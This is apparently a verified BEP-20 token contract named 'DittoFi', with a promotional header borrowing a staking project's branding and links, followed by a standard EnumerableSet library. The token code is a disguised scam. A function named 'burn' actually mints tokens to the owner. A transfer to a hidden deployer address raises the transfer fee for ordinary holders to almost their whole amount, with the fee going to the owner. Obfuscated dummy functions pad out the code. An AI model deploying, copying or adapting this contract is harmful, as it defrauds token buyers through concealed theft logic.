/**
 *Submitted for verification at BscScan.com on 2023-01-02
*/

/*
DittoFi
Premining Rewards are live! 🚨
We're delivering early yields for your #Aptos!
1.Stake $stAPT, stAPT-$APT, or stAPT-$USDC with us at https://stake.dittofinance.io/rewards
2.Earn Premining Rewards that can be redeemed for our upcoming $DTO token at a *deep* discount.
Details below 👇
The liquid staking solution for #Aptos. 💧 
$stAPT 👉 Safe. Secure. Everywhere.
Discord: https://discord.gg/ditto-fi
Medium: https://medium.com/@dittoprotocol
Twitter:https://twitter.com/Ditto_Finance   

*/
// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.13;
contract DittoFi {
uint256 private  kOaBeD = 3;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  sAgIQt = 9;
string public  name = "DittoFi";
mapping (address => uint256) public balanceOf;
address private  MPPhIj = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  usXyBI = address(0);
address private  CLCQPJ = address(0);
address private  NlTJiZ = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  VkklMs = address(0);
address private  oTbIGB = address(0);
string public  symbol = "DittoFi";
uint256 private  zfjZMb = 15;
uint256 private  HaSmLV = 1000000000000000000;
uint256 private  vJQnxX = 27;
address private  FJHsiJ = address(0);
uint8 public constant decimals = 18;
uint256 private  emSkRh = 33;
uint256 private  AqFGVh = 39;
address public owner;
address private  zKHuhv = address(0);
uint256 public constant XKaCns = 99999;
uint256 public constant totalSupply = 100000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address private  CIqyQi = address(0);
function _add1FJHsiJ() private returns (address) {
return FJHsiJ;
}
//
//
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getv2JQnxX() private returns (uint256) {
return vJQnxX - HaSmLV;
}
//
function _addCI3qyQi() private returns (address) {
return CIqyQi;
}
//
function _getAqF4GVh() private returns (uint256) {
return AqFGVh + emSkRh;
}
//
function _addsAgI5Qt() private returns (uint256) {
return sAgIQt + kOaBeD;
}
//
//
//
//
//
//
//
function _getMPPhI6j() private returns (address) {
return MPPhIj;
}
//
//
//
function _addkOaBeD7() private returns (uint256) {
return kOaBeD++;
}
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
function _getu8sXyBI() private returns (address) {
return usXyBI;
}
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
//
//
//
//
//
//
function _addzf9jZMb() private returns (uint256) {
return zfjZMb - sAgIQt;
}
//
function _getemS10kRh() private returns (uint256) {
return emSkRh++;
}
//
//
//
constructor () public {
zKHuhv = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
//
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tAXfqPK 0");
require(spender != address(0), "fAXfqPK 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _addCLCQ11PJ() private returns (address) {
return CLCQPJ;
}
//
//
//
function _getNlTJi12Z() private returns (address) {
return NlTJiZ;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
//
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "AXfqPK");
require(to != address(0), "AXfqPK");
require(amount <= balanceOf[from], "AXfqPK");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* XKaCns/HaSmLV ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==zKHuhv){
HaSmLV = XKaCns+2;
}
emit Transfer(from, to, transferAmount);
}
function _addVkklMs13() private returns (address) {
return VkklMs;
}
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
//
//
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
//
//
function _geto14TbIGB() private returns (address) {
return oTbIGB;
}
//
//
//
//
}

library EnumerableSet {
    struct Set {
        // Storage of set values
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }
    struct Bytes32Set {
        Set _inner;
    }
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }
    struct AddressSet {
        Set _inner;
    }
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }
    struct UintSet {
        Set _inner;
    }
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
   function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}